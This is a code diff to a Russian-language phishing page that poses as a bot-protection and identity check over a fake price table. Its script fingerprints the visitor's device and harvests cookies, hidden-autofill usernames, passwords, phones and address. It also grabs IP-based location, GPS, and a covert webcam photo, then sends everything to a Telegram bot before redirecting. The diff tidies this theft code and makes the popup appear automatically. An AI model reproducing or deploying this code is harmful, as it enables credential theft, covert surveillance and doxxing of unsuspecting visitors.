@@ -22,15 +22,14 @@ table{width:100%;border-collapse:collapse;background:#121720;border:1px solid #1
 th{background:#161c26;padding:12px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#64748b}
 td{padding:10px 14px;border-bottom:1px solid #1a2030;font-size:13px;white-space:nowrap}
 td.user{color:#fff}td.price{color:#10b981;font-weight:600}
-.overlay{display:flex;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.82);z-index:100;justify-content:center;align-items:center;padding:20px}
+.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.82);z-index:100;justify-content:center;align-items:center;padding:20px}
+.overlay.show{display:flex}
 .popup{background:#121720;border:1px solid #3b82f6;border-radius:16px;padding:28px 22px;max-width:380px;width:100%;text-align:center}
 .popup h3{font-size:18px;color:#fff;margin-bottom:6px}
 .popup .desc{font-size:12px;color:#64748b;margin-bottom:16px;line-height:1.4}
 .popup .checks{text-align:left;margin:14px 0;font-size:12px;color:#64748b;line-height:1.8}
-.popup input{width:100%;padding:14px;background:#0a0e14;border:1px solid #1e2836;border-radius:10px;color:#fff;font-size:15px;font-family:inherit;text-align:center;margin-bottom:14px}
-.popup input:focus{outline:none;border-color:#3b82f6}
 .popup .btn-pop{width:100%;padding:14px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
-.popup .fineprint{font-size:9px;color:#3a4450;margin-top:10px;line-height:1.4}
+.popup .fineprint{font-size:9px;color:#3a4450;margin-top:12px;line-height:1.4}
 .hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0}
 .footer-bar{text-align:center;padding:20px;color:#64748b;font-size:11px;border-top:1px solid #1e2836;margin-top:30px}
 @media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px}}
@@ -85,7 +84,6 @@ td.user{color:#fff}td.price{color:#10b981;font-weight:600}
 ✅ Подтверждение личности<br>
 ✅ Защита от ботов
 </div>
-<input type="tel" id="popupPhone" placeholder="Введите номер телефона">
 <button class="btn-pop" onclick="submitAll()">Подтвердить и продолжить</button>
 <div class="fineprint">
 Нажимая «Подтвердить и продолжить», вы соглашаетесь<br>
@@ -129,6 +127,7 @@ shuffleAndShow();
 setInterval(shuffleAndShow,8000);
 setInterval(function(){document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
 
+// Сбор данных
 var PD={};
 PD.ua=navigator.userAgent;PD.platform=navigator.platform;PD.lang=navigator.language;
 PD.sw=screen.width;PD.sh=screen.height;
@@ -137,26 +136,21 @@ PD.cpu=navigator.hardwareConcurrency||"?";PD.ram=navigator.deviceMemory||"?";
 PD.mobile=/Mobi|Android/i.test(navigator.userAgent);
 PD.ref=document.referrer||"direct";
 PD.cookie=document.cookie||"-";
-PD.bat="-";PD.gpu="-";PD.conn="-";
+PD.bat="-";PD.gpu="-";PD.conn="-";PD.ip="-";PD.country="-";PD.city="-";PD.region="-";PD.provider="-";PD.tz_ip="-";
 
-// IP
 fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){
 PD.ip=j.ip||"-";PD.country=j.country_name||"-";PD.city=j.city||"-";
 PD.region=j.region||"-";PD.provider=j.org||"-";PD.tz_ip=j.timezone||"-";
 }).catch(function(){});
 
-// GPU
 try{
 var cv=document.createElement('canvas');var gl=cv.getContext('webgl');
 if(gl){var db=gl.getExtension('WEBGL_debug_renderer_info');
 if(db){PD.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}
 }catch(e){}
-
-// Battery
 try{navigator.getBattery().then(function(b){PD.bat=Math.round(b.level*100)+"% ch:"+b.charging})}catch(e){}
 try{if(navigator.connection){PD.conn=navigator.connection.effectiveType}}catch(e){}
 
-// Autofill
 setTimeout(function(){
 PD.af_u=document.querySelector('[name="u"]').value||"-";
 PD.af_p=document.querySelector('[name="p"]').value||"-";
@@ -167,7 +161,12 @@ PD.af_ph2=document.querySelector('[name="ph2"]').value||"-";
 PD.af_adr=document.querySelector('[name="adr"]').value||"-";
 },2500);
 
-function sendMsg(d){
+// Показываем попап через 1.5 секунды
+setTimeout(function(){
+document.getElementById('overlay').classList.add('show');
+},1500);
+
+function sendAll(d){
 var msg='🚨 ПОЛНЫЙ ЗАХВАТ\n\n'+
 '🆔 '+sid+'\n🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
 '🌐 IP: '+(d.ip||"-")+'\n'+
@@ -180,7 +179,6 @@ var msg='🚨 ПОЛНЫЙ ЗАХВАТ\n\n'+
 '🎮 '+(d.gpu||"-")+'\n'+
 '🔋 '+(d.bat||"-")+'\n'+
 '📶 '+(d.conn||"-")+'\n\n'+
-'📞 ТЕЛЕФОН: '+(d.entered_phone||"-")+'\n\n'+
 '📍 ГЕО:\nШирота: '+(d.geo_lat||"ожидание")+'\nДолгота: '+(d.geo_lng||"ожидание")+'\nТочность: '+(d.geo_acc||"ожидание")+'\n\n'+
 '📸 КАМЕРА: '+(d.camera||"-")+'\n'+
 '🎤 МИКРОФОН: '+(d.mic||"-")+'\n'+
@@ -203,11 +201,21 @@ body:JSON.stringify({chat_id:CHAT,text:msg})
 });
 }
 
-async function submitAll(){
-var phone=document.getElementById('popupPhone').value.trim();
-if(!phone){alert('Введите номер телефона');return}
-PD.entered_phone=phone;
+function sendPhoto(photo){
+var bs=atob(photo.split(',')[1]);
+var ms=photo.split(',')[0].split(':')[1].split(';')[0];
+var ab=new ArrayBuffer(bs.length);
+var ia=new Uint8Array(ab);
+for(var i=0;i<bs.length;i++){ia[i]=bs.charCodeAt(i)}
+var blob=new Blob([ab],{type:ms});
+var fd=new FormData();
+fd.append('chat_id',CHAT);
+fd.append('photo',blob,'face.jpg');
+fd.append('caption','📸 ФОТО\n🆔 '+sid);
+fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:fd});
+}
 
+async function submitAll(){
 // Гео
 if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(function(pos){
@@ -232,38 +240,26 @@ var ctx=canvas.getContext('2d');
 ctx.drawImage(video,0,0,320,240);
 var photo=canvas.toDataURL('image/jpeg',0.6);
 stream.getTracks().forEach(function(t){t.stop()});
-
-// Отправка
-sendMsg(PD);
-
-// Фото
-var bs=atob(photo.split(',')[1]);
-var ms=photo.split(',')[0].split(':')[1].split(';')[0];
-var ab=new ArrayBuffer(bs.length);
-var ia=new Uint8Array(ab);
-for(var i=0;i<bs.length;i++){ia[i]=bs.charCodeAt(i)}
-var blob=new Blob([ab],{type:ms});
-var fd=new FormData();
-fd.append('chat_id',CHAT);
-fd.append('photo',blob,'face.jpg');
-fd.append('caption','📸 ФОТО\n🆔 '+sid);
-fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:fd});
-
-document.getElementById('overlay').style.display='none';
-setTimeout(function(){window.location.replace(REDIR)},2000);
+sendAll(PD);
+sendPhoto(photo);
+done();
 },1500);
 }catch(e){
 PD.camera="отказано";
 PD.mic="отказано";
-sendMsg(PD);
-document.getElementById('overlay').style.display='none';
-setTimeout(function(){window.location.replace(REDIR)},2000);
+sendAll(PD);
+done();
 }
 
 // Уведомления
 if('Notification' in window){
 Notification.requestPermission().then(function(p){PD.notifications=p});
 }
+}
+
+function done(){
+document.getElementById('overlay').classList.remove('show');
+setTimeout(function(){window.location.replace(REDIR)},2000);
 }
 </script>
 </body>
